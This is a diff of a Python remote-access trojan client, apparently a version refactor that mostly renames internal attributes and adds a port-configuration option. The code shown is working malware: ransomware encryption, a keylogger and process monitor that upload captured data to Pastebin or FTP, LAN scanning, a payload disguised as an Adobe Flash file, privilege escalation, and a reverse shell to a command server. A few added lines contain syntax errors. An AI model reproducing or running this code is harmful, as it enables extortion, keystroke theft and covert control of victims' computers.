@@ -108,21 +108,20 @@ class Client(object):
     __name__    = 'Client'
     _abort      = False
     _debug      = False
-    _email      = None
-    _report     = None
+    _save       = None
+    _ports      = None
     _tasks      = Queue.Queue()
     _lock       = threading.Lock()
-    _services   = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
-
+    
 
     def __init__(self, **kwargs):
         self._jobs      = OrderedDict()
         self._results   = OrderedDict()
-        self._networks  = OrderedDict()
+        self._network   = OrderedDict()
         self._session   = OrderedDict()
-        self._system    = self._get_system()
-        self._commands  = self._get_commands()
-        self._setup     = self._get_setup(**kwargs)
+        self._sysinfo   = self._get_sysinfo()
+        self._command   = self._get_command()
+        self._startup   = self._get_startup(**kwargs)
 
 
     @staticmethod
@@ -590,7 +589,7 @@ class Client(object):
                 cipher  = PKCS1_OAEP.new(self._session['public_key'])
                 key     = base64.b64encode(cipher.encrypt(aes_key))
                 task_id = self._task_id(self.ransom.func_name)
-                task    = {'task': task_id, 'client': self._system['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
+                task    = {'task': task_id, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
                 self._results[task_id] = task
                 self._server_send(**task)
         except Exception as e:
@@ -704,7 +703,7 @@ class Client(object):
                 if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                     result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                     task_id = self._task_id(self.keylogger.func_name)
-                    task    = {'task': task_id, 'session': self._session['id'], 'client': self._system['id'], 'command': self.keylogger.func_name, 'result': result}
+                    task    = {'task': task_id, 'session': self._session['id'], 'client': self._sysinfo['id'], 'command': self.keylogger.func_name, 'result': result}
                     self._results[task_id] = task
                     self.keylogger.buffer.reset()
                 else:
@@ -737,7 +736,7 @@ class Client(object):
     def _scan_ping(self, host):
         try:
             if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                self._networks[host] = {}
+                self._network[host] = {}
                 return True
             else:
                 return False
@@ -755,10 +754,11 @@ class Client(object):
             data = sock.recv(1024)
             if data:
                 data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
-                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'), 'state': 'open'}}
+                data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'
+                info = {port: {'protocol': Client._ports[port]['protocol'], 'service': data, 'state': 'open'}}
             else:
-                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
-            self._networks.get(host).update(info)
+                info = {port: {'protocol': Client._ports[port]['protocol'], 'service': Client._ports.[port]['service'], 'state': 'open'}}
+            self._network.get(host).update(info)
         except (socket.error, socket.timeout):
             pass
         except Exception as e:
@@ -779,14 +779,14 @@ class Client(object):
                     if self._jobs['scanner-%d' % x].is_alive():
                         self._jobs['scanner-%d' % x].join()
                 self._task_manager.flag.set()
-            return json.dumps(self._networks)
+            return json.dumps(self._network)
         except Exception as e:
             return '{} error: {}'.format(self._scan_host.func_name, str(e))
 
 
     def _scan_network(self, *args):
         try:
-            stub = '.'.join(str(self._system['private_ip']).split('.')[:-1]) + '.%d'
+            stub = '.'.join(str(self._sysinfo['private_ip']).split('.')[:-1]) + '.%d'
             lan  = []
             for i in xrange(1,255):
                 lan.append(stub % i)
@@ -804,7 +804,7 @@ class Client(object):
                 self._jobs['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                 self._jobs['scanner-%d' % x].start()
             self._jobs['scanner-%d' % x].join()
-            return json.dumps(self._networks)
+            return json.dumps(self._network)
         except Exception as e:
             return '{} error: {}'.format(self._scan_network.func_name, str(e))
 
@@ -890,7 +890,7 @@ class Client(object):
                 aesvar      = self._get_random_var(6)
                 key         = self._get_random_var(32)
                 iv          = self._get_random_var(16)
-                output_file = "AdobeFlash_27.1.{}.py".format(random.randint(1,175))
+                output_file = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', "adobe_flashplayer_27.1.%d.py" % random.randint(1,99))
                 imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar] 
                 _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data.splitlines()]
                 cipher      = AES.new(key, AES.MODE_CBC, iv)
@@ -1353,7 +1353,7 @@ class Client(object):
                     try:
                         task_id = self._task_id(self._process_monitor.func_name)
                         result  = self._upload_pastebin(self.process.buffer) if 'ftp' not in args else self._Upload_ftp(self.process.buffer)
-                        self._results[task_id] = {'client': self._system['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
+                        self._results[task_id] = {'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
                         self.process.buffer.reset()
                     except Exception as e:
                         self.debug("{} error: {}".format(self._process_logger.func_name, str(e)))
@@ -1408,7 +1408,7 @@ class Client(object):
             while True:
                 if not self._abort:
                     self._session['prompt'].wait()
-                    self._server_send(**{'task': '0' * 64, 'client': self._system['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[{} @ %s]> ' % os.getcwd()})
+                    self._server_send(**{'task': '0' * 64, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[{} @ %s]> ' % os.getcwd()})
                     self._session['prompt'].clear()
                 else:
                     break
@@ -1437,7 +1437,7 @@ class Client(object):
 
     def _session_id(self):
         try:
-            self._session['socket'].sendall(self._encrypt_data(json.dumps(self._system)) + '\n')
+            self._session['socket'].sendall(self._encrypt_data(json.dumps(self._sysinfo)) + '\n')
             buf      = ""
             attempts = 1
             while '\n' not in buf:
@@ -1483,7 +1483,7 @@ class Client(object):
 
     def _task_id(self, task):
         try:
-            return SHA256.new(self._system['id'] + str(task) + str(time.time())).hexdigest()
+            return SHA256.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
         except Exception as e:
             self.debug("{} error: {}".format(self._task_id.func_name, str(e)))
 
@@ -1531,7 +1531,7 @@ class Client(object):
         try:
             if not key:
                 key = self._get_deobfuscated(self._session['key'])
-            return getattr(self, '_decrypt_{}'.format(self._system['encryption']))(data, key)
+            return getattr(self, '_decrypt_{}'.format(self._sysinfo['encryption']))(data, key)
         except Exception as e:
             self.debug('{} error: {}'.format(self._decrypt_data.func_name, str(e)))
 
@@ -1555,7 +1555,7 @@ class Client(object):
         try:
             if not key:
                 key = self._get_deobfuscated(self._session['key'])
-            return getattr(self, '_encrypt_{}'.format(self._system['encryption']))(data, key)
+            return getattr(self, '_encrypt_{}'.format(self._sysinfo['encryption']))(data, key)
         except Exception as e:
             self.debug('{} error: {}'.format(self._encrypt_data.func_name, str(e)))
 
@@ -1575,26 +1575,26 @@ class Client(object):
             return "File '{}' not found".format(filepath)
 
 
-    def _get_setup(self, **kwargs):
+    def _get_startup(self, **kwargs):
         for key, value in kwargs.items():
             try:
                 setattr(self, '__%s__' % key, value)
             except Exception as e:
-                self.debug("{} error: {}".format(self._get_setup.func_name, str(e)))
+                self.debug("{} error: {}".format(self._get_startup.func_name, str(e)))
   
 
-    def _get_commands(self):
+    def _get_command(self):
         commands = {}
         for cmd in vars(Client):
             if hasattr(vars(Client)[cmd], 'command'):
                 try:
                     commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Client, cmd).platforms, 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip()}
                 except Exception as e:
-                    Client.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
+                    Client.debug("{} error: {}".format(self._get_command.func_name, str(e)))
         return commands
 
 
-    def _get_system(self):
+    def _get_sysinfo(self):
         info = {}
         for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device', 'encryption']:
             value = '_get_%s' % key
@@ -1602,7 +1602,7 @@ class Client(object):
                 try:
                     info[key] = getattr(Client, value)()
                 except Exception as e:
-                    self.debug("{} error: {}".format(self._get_system.func_name, str(e)))
+                    self.debug("{} error: {}".format(self._get_sysinfo.func_name, str(e)))
         return info
 
 
@@ -1706,7 +1706,16 @@ class Client(object):
         list directory contents
         """
         try:
-            return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
+            output = []
+            if os.path.isdir(path):
+                for line in os.listdir(path):
+                    if len('\n'.join(output + [line])) < 2048:
+                        output.append(line)
+                    else:
+                        break
+                return '\n'.join(output)
+            else:
+                return "Error: path not found"
         except Exception as e2:
             return "{} error: {}".format(self.ls.func_name, str(e2))
 
@@ -1744,15 +1753,15 @@ class Client(object):
         display file contents
         """
         try:
-            output = ""
+            output = []
             if not os.path.isfile(path):
                 return "Error: file not found"
             target = open(path, 'rb')
             while True:
                 try:
                     line = target.readline().rstrip()
-                    if not line.isspace() and len(output + '\n' + line) < 4096:
-                        output += '\n' + line
+                    if not line.isspace() and len('\n'.join(output + [line])) < 4096:
+                        output.append(line)
                     else:
                         break
                 except Exception as e1:
@@ -1863,12 +1872,12 @@ class Client(object):
         """
         if not cmd:
             try:
-                return json.dumps({self._commands[c]['usage']: self._commands[c]['description'] for c in self._commands})
+                return json.dumps({self._command[c]['usage']: self._command[c]['description'] for c in self._command})
             except Exception as e1:
                 self.debug("{} error: {}".format(self.help.func_name, str(e1)))
         elif hasattr(self, str(cmd)):
             try:
-                return json.dumps({self._commands[cmd]['usage']: self._commands[cmd]['description']})
+                return json.dumps({self._command[cmd]['usage']: self._command[cmd]['description']})
             except Exception as e2:
                 self.debug("{} error: {}".format(self.help.func_name, str(e2)))
 
@@ -1885,9 +1894,9 @@ class Client(object):
             if 'jobs' in attribute:
                 return json.dumps({a: self._get_job_status(self._jobs[a].name) for a in self._jobs if self._jobs[a].is_alive()})
             elif 'privileges' in attribute:
-                return json.dumps({'username': self._system.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+                return json.dumps({'username': self._sysinfo.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
             elif 'info' in attribute:
-                return json.dumps(self._system)
+                return json.dumps(self._sysinfo)
             elif hasattr(self, attribute):
                 try:
                     return json.dumps(getattr(self, attribute))
@@ -1931,7 +1940,7 @@ class Client(object):
         """
         try:
             args = str(args).split()
-            host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._system.get('local')
+            host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._sysinfo.get('local')
             return self._scan_network(host) if 'network' in args else self._scan_host(host)
         except Exception as e:
             return "{} error: '{}'".format(self.scan.func_name, str(e))        
@@ -2119,7 +2128,7 @@ class Client(object):
         try:
             self._jobs[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
             self._jobs[self.standby.func_name].start()
-            return "Standby mode enabled. Awaiting further instructions.".format(self._system.get('ip'))
+            return "Standby mode enabled. Awaiting further instructions.".format(self._sysinfo.get('ip'))
         except Exception as e:
             return "{} error: '{}'".format(self.standby.func_name, str(e))
 
@@ -2131,7 +2140,7 @@ class Client(object):
         """
         try:
             if self._get_administrator():
-                return "Current user '{}' has administrator privileges".format(self._system.get('username'))
+                return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
             if hasattr(self, '__f__') and os.path.isfile(long_to_bytes(long(self.__f__))):
                 if os.name is 'nt':
                     ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
@@ -2307,7 +2316,7 @@ class Client(object):
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self._server_send(**{'task': '0' * 64, 'client': self._system['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[{} @ %s]> ' % os.getcwd()})
+            self._server_send(**{'task': '0' * 64, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[{} @ %s]> ' % os.getcwd()})
             while True:
                 if self._session['connection'].wait(timeout=3.0):
                     if not self._session['prompt'].is_set():
@@ -2315,9 +2324,9 @@ class Client(object):
                         if task:
                             result  = ""
                             cmd, _, action  = bytes(task['command']).partition(' ')
-                            if cmd in self._commands:
+                            if cmd in self._command:
                                 try:
-                                    result  = bytes(self._commands[cmd]['method'](action)) if len(action) else bytes(self._commands[cmd]['method']())
+                                    result  = bytes(self._command[cmd]['method'](action)) if len(action) else bytes(self._command[cmd]['method']())
                                 except Exception as e1:
                                     result  = "Error: %s" % bytes(e1)
                             else:
@@ -2328,7 +2337,7 @@ class Client(object):
                                     
                             if result and result != "None":
                                 task.update({'result': result})
-                                if cmd in self._report and 'PRIVATE KEY' not in task.get('command'):
+                                if cmd in self._save and 'PRIVATE KEY' not in task.get('command'):
                                     self._results[task['task']] = task
                                 self._server_send(**task)
                             self._session['prompt'].set()
@@ -2415,7 +2424,7 @@ def main(*args, **kwargs):
             Client._get_new_option('_get_remote_server', api_key=api)
         if 'v' in kwargs:
             v = kwargs.get('v')
-            Client._report = Client._get_user_config(v).splitlines()
+            Client._save = Client._get_user_config(v).splitlines()
         if 'd' in kwargs:
             d = kwargs.get('d')
             imgur_api_key= Client._get_user_config(d)
@@ -2432,6 +2441,10 @@ def main(*args, **kwargs):
             p = kwargs.get('p')
             ransom_account_id, ransom_api_key, ransom_api_secret, ransom_api_version, ransom_target_url = Client._get_user_config(p).splitlines()
             Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version, target_url=ransom_target_url)
+        if 'n' in kwargs:
+            n = kwargs.get('n')
+            network_ports = Client._get_user_config(n)
+            Client._ports = json.loads(network_ports)
     finally:
         payload = Client(**kwargs)
         payload.run()
@@ -2448,6 +2461,7 @@ if __name__ == '__main__':
   "g": "79328323225122003561",
   "j": "76650156158318301560",
   "l": "81040047328712224353",
+  "n": "80984525453573637194",
   "p": "80692935077109257793",
   "q": "80324520337976078676",
   "r": "81126388790932157784",
